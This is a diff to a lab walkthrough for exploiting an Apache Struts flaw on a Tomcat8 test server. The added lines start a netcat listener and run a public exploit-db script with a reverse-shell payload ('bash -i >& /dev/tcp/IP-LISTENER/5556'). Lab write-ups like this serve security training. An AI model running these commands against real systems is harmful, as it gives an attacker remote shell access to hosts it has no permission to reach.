@@ -38,14 +38,20 @@ You should no visit http://IP:8080 to see if tomcat8 is working. If the url is u
 
 **Exploitation:**
 
-Open one terminal and create a socket
+Open a terminal, then run the command below to start a TCP listner.
+
+```
+$ nc -nvlp 5556
+```
+
+Open a separate terminal, then run the commands to carry out the exploit with a reverse shell. Replace _IP-TARGET_ with the target IPv4 address. Replace _IP-LISTNER_ with your listening host's IPv4 address.
 
 ```
 # download exploit from https://www.exploit-db.com/exploits/41570/
 # or use searchsploit
 $ searchsploit Struts #optional
 $ cp /path/to/linux/webapps/41570.py exploit.py
-$ python exploit.py "http://IP:8080/http-session/hello.action" "cmd"
+$ python exploit.py "http://IP-TARGET:8080/http-session/hello.action" "bash -i >& /dev/tcp/IP-LISTENER/5556 0>&1"
 ```
 
 It may be necessary to modify your exploit.py in order to pass in the command you want.
